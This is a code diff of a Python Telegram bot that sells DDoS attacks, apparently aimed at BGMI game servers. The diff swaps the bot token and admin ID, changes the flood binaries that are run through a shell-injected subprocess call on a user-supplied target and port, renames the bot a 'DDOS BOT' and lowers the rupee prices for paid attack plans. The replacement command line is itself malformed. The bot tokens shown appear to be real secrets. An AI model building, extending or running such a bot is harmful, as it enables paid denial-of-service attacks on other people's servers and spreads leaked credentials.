@@ -16,9 +16,9 @@ from keep_alive import keep_alive
 keep_alive()
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7353106103:AAEmWPOELbGBOlzJiKX-LUkS-WcHcqTYphc')
+bot = telebot.TeleBot('7608735894:AAGmutlWmxvQomULCZdcYbd27yheDZ13Q3Y')
 # Admin user IDs
-admin_id = {"1132426169"}
+admin_id = {"907345225"}
 
 # Files for data storage
 USER_FILE = "users.json"
@@ -26,7 +26,7 @@ LOG_FILE = "log.txt"
 KEY_FILE = "keys.json"
 
 # Cooldown settings
-COOLDOWN_TIME = 0  # in seconds
+COOLDOWN_TIME = 240  # in seconds
 CONSECUTIVE_ATTACKS_LIMIT = 9
 CONSECUTIVE_ATTACKS_COOLDOWN = 3 # in seconds
 MAX_RESTARTS = 5
@@ -200,7 +200,7 @@ def handle_bgmi(message):
                     record_command_logs(user_id, '/bgmi', target, port, time)
                     log_command(user_id, target, port, time)
                     start_attack_reply(message, target, port, time)
-                    full_command = f"./bgmi {target} {port} {time} 500"
+                    full_command = f"./S4 {target} {port} {time} 110", "./S41 {target} {port} {time} 10"
                     subprocess.run(full_command, shell=True)
                     response = f"𝘼𝙩𝙩𝙖𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 🔥"
             except ValueError:
@@ -310,7 +310,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''🔹 𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙂𝙊𝘿𝙭𝘽𝙂𝙈𝙄 𝘿𝘿𝙊𝙎 𝘽𝙊𝙏 🔹
+    response = f'''🔹 𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝘿𝘿𝙊𝙎 𝘽𝙊𝙏 🔹
 '''
     bot.reply_to(message, response)
 
@@ -336,12 +336,12 @@ VIP 🌟:
 -> Concurrent attacks: 3
 
 𝐓𝐄𝐑𝐈 𝐀𝐔𝐊𝐀𝐃 𝐒𝐄 𝐁𝐀𝐇𝐀𝐑 💸:
-1𝐃𝐚𝐲: 200 𝐫𝐬
-3𝐃𝐚𝐲: 450 𝐫𝐬
-1𝐖𝐞𝐞𝐤: 800 𝐫𝐬
-2𝐖𝐞𝐞𝐤: 1200 𝐫𝐬
-𝐌𝐨𝐧𝐓𝐡: 1700 𝐫𝐬 
-@GODxBGMI_OWNER 💥
+1𝐃𝐚𝐲: 100 𝐫𝐬
+3𝐃𝐚𝐲: 250 𝐫𝐬
+1𝐖𝐞𝐞𝐤: 500 𝐫𝐬
+2𝐖𝐞𝐞𝐤: 900 𝐫𝐬
+𝐌𝐨𝐧𝐓𝐡: 1200 𝐫𝐬 
+@Rishabgupta01 💥
 '''
     bot.reply_to(message, response)
 
